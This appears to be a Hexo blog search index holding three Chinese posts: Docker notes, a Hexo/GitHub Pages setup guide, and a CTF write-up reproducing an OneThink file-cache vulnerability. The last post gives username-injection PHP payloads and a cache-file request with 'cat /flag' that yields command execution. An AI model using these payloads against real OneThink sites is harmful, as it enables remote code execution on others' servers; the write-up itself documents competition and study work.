@@ -1,0 +1,86 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+  
+    
+    <entry>
+      <title>docker学习笔记（一）</title>
+      <link href="/2019/11/26/dockerStudy_1/"/>
+      <url>/2019/11/26/dockerStudy_1/</url>
+      
+        <content type="html"><![CDATA[<h3 id="docker简介"><a href="#docker简介" class="headerlink" title="docker简介"></a>docker简介</h3><p><img src="/image/docker1.png" alt="image"><br>Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的镜像中，然后发布到任何流行的 Linux或Windows 机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口。</p><h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><p><strong>Linux</strong><br><em>Debian系</em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install docker</span><br></pre></td></tr></table></figure><p><em>Redhat系</em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo yum install docker</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> docker </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> docker </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>github + hexo + Windows折腾过程</title>
+      <link href="/2019/10/31/Hexo+Github+Win/"/>
+      <url>/2019/10/31/Hexo+Github+Win/</url>
+      
+        <content type="html"><![CDATA[<p><strong>就不唠嗑了，直接上教程了。</strong></p><h3 id="1-安装git"><a href="#1-安装git" class="headerlink" title="1.安装git"></a>1.安装git</h3><p><a href="https://git-scm.com/download/win" target="_blank" rel="noopener">地址在此</a></p><h3 id="2-安装Node-js"><a href="#2-安装Node-js" class="headerlink" title="2.安装Node.js"></a>2.安装Node.js</h3><p><a href="https://nodejs.org/en/" target="_blank" rel="noopener">地址在此</a><br><strong>安装成功后，Win+R 打开cmd</strong><br>    <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Admin&gt;git --version</span><br><span class="line">C:\Users\Admin&gt;node --version</span><br><span class="line">C:\Users\Admin&gt;npm --version</span><br></pre></td></tr></table></figure></p><p><img src="/image/0007.png" alt="img0" title="cmd"><br><em>有如图类似版本号回复即安装成功</em></p><h3 id="3-安装Hexo"><a href="#3-安装Hexo" class="headerlink" title="3.安装Hexo"></a>3.安装Hexo</h3><p>在D盘新建Blog/Hexo文件夹，进入文件夹，在文件夹内空白处右击，点击”Git Bash here”<br>依次输入：<br>    <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-cli -g</span><br><span class="line">$ npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><br><img src="/image/0009.png" alt="img1" title="hexo"><br>打开D:/Blog/Hexo如图显示<br><img src="/image/0030.png" alt="img19" title="index"><br>git终端输入<br>    <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo g</span><br><span class="line">$ hexo s</span><br></pre></td></tr></table></figure><br>    出现以下提示即可以打开浏览器输入 <a href="http://localhost:4000" target="_blank" rel="noopener">http://localhost:4000</a> 开始预览安装效果<br>    <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">INFO  <span class="built_in">Start</span> processing</span><br><span class="line">INFO  Hexo is running <span class="built_in">at</span> http://localhost:<span class="number">4000</span> . Press Ctrl+C to stop.</span><br></pre></td></tr></table></figure><br><img src="/image/0029.png" alt="img18" title="index"></p><h3 id="4-将博客部署到-Github-上"><a href="#4-将博客部署到-Github-上" class="headerlink" title="4.将博客部署到 Github 上"></a>4.将博客部署到 Github 上</h3><ul><li>a. 注册Github <a href="https://github.com/join?source=header" target="_blank" rel="noopener">地址在此</a></li><li>b. 创建仓库<br>  <em>点击 <strong>右上角头像-&gt;Your repository-&gt;New</strong> 开始创建，</em></li></ul><p><img src="/image/0008.png" alt="img2" title="New repository"></p><p><img src="/image/0014.png" alt="img3" title="New repository"></p><ul><li>c.配置SSH密钥<br>进入Blog文件夹，右击，打开Git Bash Here <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-keygen -t rsa -C <span class="string">"youremail@example.com"</span> // <span class="string">" "</span>内为你的邮箱</span><br></pre></td></tr></table></figure><img src="/image/0015.png" alt="img4" title="RSA"><br>然后复制公钥,此命令会将公钥复制到剪贴板<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ clip &lt; ~/.ssh/id_rsa.pub</span><br></pre></td></tr></table></figure>点击GitHub右上角头像 –&gt; Settings –&gt; SSH and GPG keys –&gt; New SSH key<br><img src="/image/0016.png" alt="img5" title="Add SSH Key"><br><strong>测试</strong><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -T git@github.com</span><br></pre></td></tr></table></figure><img src="/image/0017.png" alt="img6" title="Test SSH"><br><strong>配置Git信息</strong><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name <span class="string">"username"</span> //填你自己的</span><br><span class="line">git config --global user.email  <span class="string">"Email"</span></span><br></pre></td></tr></table></figure></li></ul><p>返回仓库界面，点击 Use SSH 然后点击3箭头所指 复制 地址<br><img src="/image/0018.png" alt="img7" title="SSH"></p><p><strong>打开D:/Blog/Hexo/_config.yml</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: 你复制的地址    </span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p><strong>//！！每个：后面都有个空格！！</strong><br><img src="/image/0019.png" alt="img8" title="_config.yml"><br><strong>然后直接 hexo g -d</strong><br><img src="/image/0020.png" alt="img9" title="error"><br><strong>若有以上Error，请执行</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>然后再执行 hexo g -d<br><img src="/image/0021.png" alt="img10" title="updata"><br><strong>恭喜！你的blog成功上传至Github，你可使用 <a href="https://username.github.io" target="_blank" rel="noopener">https://username.github.io</a> 访问你的主页</strong><br><strong>如果出现404，请打开仓库设置，GitHub Pages –&gt; Source –&gt; master branch</strong><br><img src="/image/0027.png" alt="img16" title="404"><br><img src="/image/0028.png" alt="img17" title="404"></p><h3 id="5-写Blog"><a href="#5-写Blog" class="headerlink" title="5.写Blog"></a>5.写Blog</h3><p><strong>在Hexo文件夹内打开Git Bash</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"文章title"</span></span><br></pre></td></tr></table></figure><p>在 /Hexo/source/_posts 文件夹下会生成相应的 “文章tiile.md” 的文档,打开编辑<br><em>基本格式为</em><br><img src="/image/0022.png" alt="img11" title="test.md"><br><strong>写完后hexo g -d推送到blog主页</strong></p><h3 id="6-换主题"><a href="#6-换主题" class="headerlink" title="6.换主题"></a>6.换主题</h3><p><strong>进入Hexo官方主题库 <a href="https://hexo.io/themes/" target="_blank" rel="noopener">点此进入</a></strong><br><img src="/image/0023.png" alt="img12" title="themes"><br>找到自己喜欢的主题点开，再点击最下面的主题地址<br><img src="/image/0024.png" alt="img13" title="themes"><br>根据官方教程安装主题<br><strong>注意 clone成功后，需将Hexo文件夹下_config.yml中的theme: 字段改为相应的主题名，如：下下图</strong><br><img src="/image/0025.png" alt="img14" title="themes"><br><img src="/image/0026.png" alt="img15" title="themes"></p><p><strong>主题安装成功 hexo clean 清除缓存，hexo g -d 上传到github</strong></p><p><strong>凑字数</strong></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 博客搭建 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> hexo </tag>
+            
+            <tag> Windows </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>onethink文件缓存漏洞复现</title>
+      <link href="/2019/10/30/OnethinkVulnerability/"/>
+      <url>/2019/10/30/OnethinkVulnerability/</url>
+      
+        <content type="html"><![CDATA[<h1 id="2019江西省信安大赛web1"><a href="#2019江西省信安大赛web1" class="headerlink" title="2019江西省信安大赛web1"></a>2019江西省信安大赛web1</h1><p><strong>本次比赛采用的是AWD红蓝对抗赛制，过程’风平浪静 菜鸡互啄’</strong><br><img src="/image/0001.png" alt="homepage" title="homepage"></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>Server：<a href="https://ubuntu.com/download/server" target="_blank" rel="noopener">Ubuntu_Server</a><br>Mysql:    5.7<br>PHP:    7.2</p><blockquote><ul><li>此处推荐我搜到的文章 <a href="https://www.cnblogs.com/xpwi/p/9818751.html" target="_blank" rel="noopener">Ubuntu搭建web服务</a></li><li>我下错了，下载成了onethink1.1开发版，但不影响<br>  <strong><em>注意：onethink需要php-gd,记得其他扩展中选择安装</em></strong></li><li><a href="https://blog.csdn.net/xy707707/article/details/80820189" target="_blank" rel="noopener">mysql密码修改</a></li><li><a href="https://www.linuxidc.com/Linux/2018-09/154250.htm" target="_blank" rel="noopener">创建</a><strong>user</strong>:onethink，<strong>passwd</strong>:onethink，<strong>database</strong>:onethink 的数据库</li><li>下载<a href="https://github.com/liu21st/onethink" target="_blank" rel="noopener">onethink</a>,将wwwroot里面的所有文件copy到/var/www/html里面</li><li>主机打开192.168.123.16 开始安装</li></ul></blockquote><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>经百度‘onethink漏洞’，发现这个系统有文件缓存漏洞<br><strong>打开安装好的onethink环境</strong><br>点击右上角的注册 </p><ul><li>注册2个账号<blockquote><p>$a=$_GET[a];//<br>system(&amp;a);//</p></blockquote><h3 id="2个账号分开注册！"><a href="#2个账号分开注册！" class="headerlink" title="2个账号分开注册！"></a>2个账号分开注册！</h3></li><li>如图拦截注册post请求操作<blockquote><p>将username字段改为 %0d%0a$a=$_GET[a];//<br>右击选择 URL-encode as you type<br>Forward –&gt; Intercept is off 停止拦截</p></blockquote><img src="/image/0002.png" alt="post1" title="post1"></li><li>然后跳转登录页 拦截登录post请求<br><img src="/image/0003.png" alt="post2" title="post2"></li><li>登录成功后显示为<br><img src="/image/0004.png" alt="image0" title="image"></li></ul><p>经过查看我本机的缓存文件(Runtime/Temp/ff7f4a808c442790de8722fb8d90d304.php),发现2个用户名已执行成为php代码</p><ul><li>1.1开发版与用户有关的缓存文件名为<blockquote><p>ff7f4a808c442790de8722fb8d90d304.php<br>7665493b900f51fe6638c89144516207.php<br>2个都可以利用，</p></blockquote><img src="/image/0006.png" alt="image1" title="image"></li><li>浏览器访问缓存文件<blockquote><p>给变量a一个值<br>xxx.php?a=cat /flag<br>即可直接执行系统命令</p></blockquote></li></ul><h2 id="getshell-成功"><a href="#getshell-成功" class="headerlink" title="getshell 成功"></a>getshell 成功</h2><p><img src="/image/0005.png" alt="image2" title="image"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> web安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> onethink </tag>
+            
+            <tag> AWD </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
+</search>
